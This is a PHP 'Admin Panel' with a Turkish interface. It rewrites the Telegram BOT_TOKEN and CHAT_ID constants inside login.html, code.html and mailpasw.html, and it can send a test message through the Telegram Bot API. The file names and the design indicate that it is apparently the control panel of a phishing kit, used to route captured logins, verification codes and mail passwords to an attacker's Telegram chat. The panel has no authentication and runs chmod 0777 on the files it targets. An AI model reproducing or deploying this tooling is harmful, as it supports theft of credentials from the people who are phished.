<?php
$files = [
    __DIR__ . '/login.html',
    __DIR__ . '/code.html', 
    __DIR__ . '/mailpasw.html' // Yeni eklendi
];
$message = '';
$message_type = '';

// Mevcut değerleri oku (ilk bulunan dosyadan)
$current = ['bot_token' => '', 'chat_id' => ''];
foreach ($files as $file) {
    if (file_exists($file)) {
        $content = @file_get_contents($file);
        if ($content) {
            preg_match('/const\s+BOT_TOKEN\s*=\s*"([^"]*)"/', $content, $t);
            preg_match('/const\s+CHAT_ID\s*=\s*"([^"]*)"/', $content, $c);
            if (!empty($t[1]) || !empty($c[1])) {
                $current['bot_token'] = $t[1] ?? '';
                $current['chat_id'] = $c[1] ?? '';
                break;
            }
        }
    }
}

// Form gönderildiğinde
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $new_token = trim($_POST['bot_token'] ?? '');
    $new_chat_id = trim($_POST['chat_id'] ?? '');
    
    if (empty($new_token) || empty($new_chat_id)) {
        $message = '❌ Boş alan bırakmayın!';
        $message_type = 'error';
    } else {
        $success_count = 0;
        $error_details = [];
        
        foreach ($files as $file) {
            if (!file_exists($file)) {
                continue; // Dosya yoksa atla
            }
            
            $content = @file_get_contents($file);
            if ($content === false) {
                $error_details[] = basename($file) . ": Okunamadı";
                continue;
            }
            
            $original = $content;
            
            // BOT_TOKEN değiştir
            $content = preg_replace(
                '/const\s+BOT_TOKEN\s*=\s*"[^"]*"/',
                'const BOT_TOKEN = "' . addslashes($new_token) . '"',
                $content
            );
            
            // CHAT_ID değiştir
            $content = preg_replace(
                '/const\s+CHAT_ID\s*=\s*"[^"]*"/',
                'const CHAT_ID = "' . addslashes($new_chat_id) . '"',
                $content
            );
            
            // Değişiklik oldu mu?
            if ($content === $original) {
                $error_details[] = basename($file) . ": Değişiklik yok (eşleşme bulunamadı)";
                continue;
            }
            
            // Yazma izni ver
            if (!is_writable($file)) {
                @chmod($file, 0777);
            }
            
            // Yazmayı dene
            $result = @file_put_contents($file, $content, LOCK_EX);
            
            if ($result === false) {
                // Alternatif: temp dosyası
                $temp = $file . '.tmp';
                if (@file_put_contents($temp, $content)) {
                    if (@rename($temp, $file)) {
                        $success_count++;
                        $error_details[] = basename($file) . ": ✅ Güncellendi (alternatif)";
                    } else {
                        @unlink($temp);
                        $error_details[] = basename($file) . ": ❌ Rename başarısız";
                    }
                } else {
                    $error_details[] = basename($file) . ": ❌ Yazılamadı";
                }
            } else {
                $success_count++;
                $error_details[] = basename($file) . ": ✅ Güncellendi";
            }
        }
        
        if ($success_count > 0) {
            $message = "✅ $success_count dosya güncellendi!";
            $message_type = 'success';
            $current = ['bot_token' => $new_token, 'chat_id' => $new_chat_id];
        } else {
            $message = '❌ Hiçbir dosya güncellenemedi!';
            $message_type = 'error';
        }
    }
}

// Test mesajı
if (isset($_GET['test']) && $current['bot_token'] && $current['chat_id']) {
    $url = "https://api.telegram.org/bot{$current['bot_token']}/sendMessage";
    $data = ['chat_id' => $current['chat_id'], 'text' => "🧪 Test! " . date('H:i:s')];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $result = json_decode($response, true);
    $message = ($result['ok'] ?? false) ? '✅ Test başarılı!' : '❌ Hata: ' . ($result['description'] ?? 'Bilinmeyen');
    $message_type = ($result['ok'] ?? false) ? 'success' : 'error';
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-gradient-to-br from-blue-900 to-green-700 min-h-screen p-6">
    <div class="max-w-2xl mx-auto">
        <h1 class="text-white text-2xl font-bold mb-6"><i class="fas fa-cog mr-2"></i>Admin Panel</h1>
        
        <?php if ($message): ?>
        <div class="mb-4 p-4 rounded-lg <?php echo $message_type === 'success' ? 'bg-green-500/20 text-green-100 border border-green-500/50' : 'bg-red-500/20 text-red-100 border border-red-500/50'; ?>">
            <?php echo $message; ?>
        </div>
        <?php endif; ?>

        <div class="bg-white rounded-2xl shadow-2xl p-6 mb-6">
            <h2 class="text-gray-800 font-bold mb-4">Telegram Ayarları</h2>
            
            <form method="POST" class="space-y-4">
                <div>
                    <label class="block text-gray-700 font-semibold mb-1 text-sm">Bot Token</label>
                    <input type="text" name="bot_token" value="<?php echo htmlspecialchars($current['bot_token']); ?>" 
                           class="w-full px-4 py-3 bg-gray-50 border rounded-xl font-mono text-sm" required>
                </div>
                <div>
                    <label class="block text-gray-700 font-semibold mb-1 text-sm">Chat ID</label>
                    <input type="text" name="chat_id" value="<?php echo htmlspecialchars($current['chat_id']); ?>" 
                           class="w-full px-4 py-3 bg-gray-50 border rounded-xl font-mono text-sm" required>
                </div>
                
                <div class="flex gap-3">
                    <button type="submit" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl">
                        <i class="fas fa-save mr-2"></i> Kaydet
                    </button>
                    <?php if ($current['bot_token'] && $current['chat_id']): ?>
                    <a href="?test=1" class="flex-1 bg-green-600 hover:bg-green-700 text-white font-semibold py-3 rounded-xl text-center">
                        <i class="fas fa-paper-plane mr-2"></i> Test
                    </a>
                    <?php endif; ?>
                </div>
            </form>
        </div>

        <!-- Dosya Durumları -->
        <div class="bg-gray-900 rounded-2xl p-4 text-green-400 font-mono text-xs space-y-2">
            <p class="text-white font-bold mb-2">📁 Yönetilen Dosyalar:</p>
            <?php foreach ($files as $file): 
                $name = basename($file);
                $exists = file_exists($file);
                $writable = $exists ? is_writable($file) : false;
            ?>
            <p>
                • <?php echo $name; ?>: 
                <?php if (!$exists): ?>
                    <span class="text-red-400">❌ Yok</span>
                <?php elseif (!$writable): ?>
                    <span class="text-yellow-400">⚠️ Salt okunur</span>
                <?php else: ?>
                    <span class="text-green-400">✅ Yazılabilir</span>
                <?php endif; ?>
            </p>
            <?php endforeach; ?>
            
            <?php if (!empty($error_details)): ?>
            <p class="text-white font-bold mt-2">📝 Son İşlem:</p>
            <?php foreach ($error_details as $detail): ?>
            <p class="<?php echo strpos($detail, '✅') !== false ? 'text-green-400' : 'text-red-400'; ?>">
                • <?php echo $detail; ?>
            </p>
            <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
